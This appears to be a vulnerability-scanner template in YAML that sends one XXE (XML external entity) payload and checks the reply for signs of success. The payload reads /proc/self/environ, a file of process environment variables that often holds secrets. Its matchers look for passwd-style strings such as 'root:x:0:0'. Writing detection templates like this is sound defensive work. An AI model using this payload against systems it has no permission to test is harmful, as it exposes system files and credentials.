id: xxe5-0079
name: 'XXE read in payload'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via payload'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      payload:
        - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
